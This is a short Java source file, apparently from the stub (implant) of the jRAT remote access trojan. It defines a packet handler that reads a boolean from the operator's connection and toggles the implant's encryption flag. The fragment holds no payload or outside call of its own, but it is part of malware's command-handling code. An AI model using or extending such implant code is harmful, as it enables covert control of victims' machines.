package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Main;

public class Packet99Encryption extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
